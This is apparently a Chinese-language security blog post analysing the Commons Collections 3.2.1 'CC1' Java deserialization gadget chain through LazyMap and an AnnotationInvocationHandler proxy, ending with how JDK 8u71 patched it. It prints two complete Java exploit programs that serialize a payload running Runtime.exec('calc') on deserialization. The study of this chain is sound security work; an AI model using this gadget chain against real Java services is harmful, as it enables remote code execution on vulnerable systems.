---
layout: post
date: 2025-4-10
title: "CommonsCollections-CC1(LazyMap)-分析"
author: "XinYiSleep"
category: Java
---
<h1 id="n2cgu">一.基础信息</h1>

```java
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

javaversion: 1.8.65
```

<h1 id="n5pBs">二.LazyMap</h1>

```
这里就不罗嗦了哈，书接上回，在我们搞懂上回内容之后，其实并不是正版的cc1链，意不意外不过不要灰心正版其实也不是很难，我们记得在找transform
是存在多个地方调用的(图一),在上回中我们用到的是TransformedMap.checkS
etValue,可以看下图中明显存在很多这里我们跟着正版cc1走一趟，这里用到了
LazyMap.get(图二),我们首先需要考虑的是factory必须是Chained
Transformer类，因为恶意方法后面这块是不需要改的，只是正版的并没走TransformedMap类而是走的LazyMap，但是这里和TransformedMap非常相似，构造函数也是protected巧合的是也存在一个decorate静态函数(图三)，
那么这里模拟一下能否利用，下面代码也是成功执行。
```
```java
package com.example.cc1_2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class Cc12Application {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);
        decorate.get(Runtime.class);
}
```
![](https://xinyisleep.github.io/img/2025/commons-collections/16.1.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/17.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/18.png)

<h1 id="wIeWd">三.动态代理</h1>

```
到这里呢我们就要去找get了,反正咋也不知道咋找出来的，Annotation
InvocationHandler类中依赖了InvocationHandler接口并且实现了invoke
(图一)这里明显是一个动态代理，咋说呢也就是说想要调用invoke,那么通过代理对象就可以执行invoke，方法只要在接口中声明就可以了,
这里也是很巧合在当前类AnnotationInvocationHandler中存在readObject入口类(图二)，并且很显然entrySet方法是在Map中声明的(图三)，
那我们捋一下思路首先要执行到invoke就必须动态代理一个对象，巧合的是在readObject入口类里面存在memberValues.entrySet()我们得控制memberValues是一个实现Map的对象也就是动态代理的对象就可以直接执行到invoke了。
```
![](https://xinyisleep.github.io/img/2025/commons-collections/19.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/20.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/21.png)

<h1 id="YEWmv">四.链子编写</h1>

```
到这里只需要控制memberValues就可以了,但是在AnnotationInvocation
Handler中构造方法不是Public(图一)，那就反射呗,下面是完整的exp。
```
![](https://xinyisleep.github.io/img/2025/commons-collections/22.png)

```java
package com.example.cc1_2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class Cc12Application {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);
        Object proxy = (Map)Proxy.newProxyInstance(objectObjectHashMap.getClass().getClassLoader(), objectObjectHashMap.getClass().getInterfaces(), o);
        Object o1 = declaredConstructor.newInstance(Override.class, proxy);



        serialize(o1);
        unserialize("ser.bin");
    }
        public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }

```

<h1 id="EzFvm">五.漏洞修复</h1>

<h2 id="mc0Gq">1.正版链子LazyMap修复</h2>
```
首先先说一下盗版的链子LazyMap,这个在8u71版本之后修复了，
原因是不在是通过`defaultReadObject`方式而是通过`readFields`这两个不同的点是`defaultReadObject`是获取所有属性`readFields`则是获取指定的属性(图一)，所以既然获取指定属性了那么memberValues就是null。
```
![](https://xinyisleep.github.io/img/2025/commons-collections/23.png)

<h2 id="j53jh">2.TransformedMap链子修复</h2>
```
删除了`setValue()`
```
![](https://xinyisleep.github.io/img/2025/commons-collections/24.png)

